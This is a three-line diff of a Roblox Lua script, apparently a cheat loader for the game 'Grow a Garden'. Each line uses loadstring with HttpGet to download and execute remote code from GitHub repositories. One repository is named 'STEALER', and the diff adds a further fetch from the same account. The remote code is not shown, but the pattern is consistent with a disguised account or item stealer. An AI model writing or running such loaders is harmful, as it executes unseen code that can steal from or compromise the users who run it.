@@ -1,2 +1,3 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/KuniDevLua/GrowAGarden/refs/heads/main/kunihublibrary2"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptsz99/STEALER/refs/heads/main/X"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptsz99/growagarden/refs/heads/main/deltafucks"))()
